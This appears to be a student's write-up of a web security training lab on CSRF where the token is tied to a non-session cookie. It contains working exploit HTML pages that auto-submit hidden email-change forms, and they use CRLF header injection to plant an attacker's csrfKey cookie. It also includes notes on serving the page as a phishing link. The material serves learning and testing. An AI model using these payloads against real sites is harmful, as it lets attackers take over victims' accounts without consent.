This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

- `wiener:peter`
- `carlos:montoya`

---

template
```html
<html>
	<body>
		<h1>Hello World!</h1>
		<iframe style="display:none" name="csrf-iframe"></iframe>
		<form action="https://bank.com/email/change/" method="post" target="csrf-iframe" id="csrf-form">
			<input type="hidden" name="email" value="test@test.com">
			<input type="hidden" name="csrf" value="CQsVzkB7dcWbPqassMZMhBuv6k0l6iZU">
		</form>
		<script>
		document.getElementById("csrf-form").submit()
		</script>
	</body>
</html>
```

- App has cookie bases session handling
- Cookie is different to the CSRF

_Some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks._

Requirements:
- Attacker CSRF Token
- Attacker CSRF Key
	- Firefox -> Storage -> Cookies
	- Open another firefox tab incognito so you can log in the Attacker user.

Exploit:
```html
<html>
	<body>
		<h1>Hello World!</h1>
		<iframe style="display:none" name="csrf-iframe"></iframe>
		<form action="https://bank.com/email/change/" method="post" target="csrf-iframe" id="csrf-form">
			<input type="hidden" name="email" value="test@test.com">
			<input type="hidden" name="csrf" value="CQsVzkB7dcWbPqassMZMhBuv6k0l6iZU">
		</form>
		<img style="display:none;" src="https://bank.com/email/change/?search=hat%0d%0aSet-Cookie:%20csrfKey=<Attacker_CSRFKey_Cookie>" onerror="document.forms[0].submit()">
	</body>
</html>
```

Serve the page:
- Move into the directory and server the page
- Create the phishing link
```php
python3 -m http.server 80
```

```php
http://127.0.0.1:80/<FILE>
```


---

Rana:

```html
<html>
    <body>
        <h1>Hello World!</h1>
        <form action="https:///0a33009903154da184367954005e0013.web-security-academy.net/my-account/change-email" method="post" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
            <input type="hidden" name="csrf" value="UYjqwyyGyrsnr8qGu5adRFltwGbIS8S6">
        </form>

        <img src="https://0a33009903154da184367954005e0013.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=04WkQgPVzQFtURvOaoJEwc04UjhQb5Gb%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>
```

Lab #5 - CSRF where token is tied to non-session cookie

Vulnerable parameter - email change functionality

Goal - exploit CSRF to change email address

Creds - wiener:peter, carlos:montoya

Analysis:

In order for a CSRF attack to be possible:
- A relevant action: change a users email
- Cookie-based session handling: session cookie
- No unpredictable request parameters 


Testing CSRF Tokens:
1. Remove the CSRF token and see if application accepts request
2. Change the request method from POST to GET
3. See if csrf token is tied to user session

Testing CSRF Tokens and CSRF cookies:
1. Check if the CSRF token is tied to the CSRF cookie
   - Submit an invalid CSRF token
   - Submit a valid CSRF token from another user
2. Submit valid CSRF token and cookie from another user

csrf token: SXsROOTp3jzq6M5UzIL2KkJIqGpffIQb
csrfKey cookie: ho7GGxMe4EZSrQ8xZ0sBDq2yW0ey9bKH

In order to exploit this vulnerability, we need to perform 2 things:
1. Inject a csrfKey cookie in the user's session (HTTP Header injection) - satisfied
2. Send a CSRF attack to the victim with a known csrf token